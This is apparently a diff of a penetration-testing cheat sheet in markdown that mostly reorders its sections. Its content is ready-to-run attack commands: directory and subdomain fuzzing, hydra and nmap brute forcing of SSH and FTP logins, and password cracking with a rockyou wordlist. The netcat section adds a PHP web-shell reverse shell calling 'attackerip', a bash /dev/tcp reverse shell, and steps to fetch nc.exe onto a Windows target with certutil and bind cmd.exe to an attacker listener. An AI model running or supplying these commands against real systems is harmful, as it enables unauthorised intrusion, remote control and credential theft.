@@ -20,8 +20,9 @@
 - [16. Privilege escalation](/Privilege.md)
 - [17. Simple Local Web Servers](#localweb)
 
-# 7. Cewl <a name="cewl"></a>
-- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
+
+
+
 
 # 3. Gobuster <a name="gobuster"></a>
 ```
@@ -36,6 +37,9 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 ```  
 
 
+
+
+
 # 4. FFUF <a name="ffuf"></a>
 - FFUF is used to filter the invalid pages 
 - ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
@@ -45,14 +49,27 @@ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100
 ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65
 ```
 
+
+
+
+
 # 5. Nikto <a name="nikto"></a>
 - ```nikto -h http://127.0.0.1```
 
 
 
 
+
 # 6. Mysql <a name="mysql"></a>
 - ```mysql -u root -p -h $ip```
+
+
+
+
+
+# 7. Cewl <a name="cewl"></a>
+- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
+
 
 
 
@@ -93,6 +110,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 
+
 # 10. FTP <a name="ftp"></a>
 ```
 nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
@@ -106,25 +124,15 @@ nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0
 
 
 
-# 14. netcat <a name="nc"></a>
-```php
-<?php
- exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
-?>
+
+
+# 11. Password Cracking <a name="cracking"></a>
+### John The Ripper
 ```
-```Bash
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
 ```
-__Download the reverse shell in windows__
-  - > __First we need to host the file in your kali linux__
-    - __`cd /usr/share/windows-binaries/`__
-    - __`python -m SimpleHTTPServer 80`__
-  - > __Go to the target windows system type the below command in the `cmd`__
-    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
-  - > __run the below command in kali linux__
-    > __`nc -nvlp 1234`__
-  - > __we need to run the file in target system__
-    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
+
+
 
 
 
@@ -149,11 +157,29 @@ exploit
 - __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
 
 
-# 11. Password Cracking <a name="cracking"></a>
-### John The Ripper
+
+
+
+# 14. netcat <a name="nc"></a>
+```php
+<?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
+?>
 ```
-john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
+```Bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
+__Download the reverse shell in windows__
+  - > __First we need to host the file in your kali linux__
+    - __`cd /usr/share/windows-binaries/`__
+    - __`python -m SimpleHTTPServer 80`__
+  - > __Go to the target windows system type the below command in the `cmd`__
+    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
+  - > __run the below command in kali linux__
+    > __`nc -nvlp 1234`__
+  - > __we need to run the file in target system__
+    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__
+
 
 
 
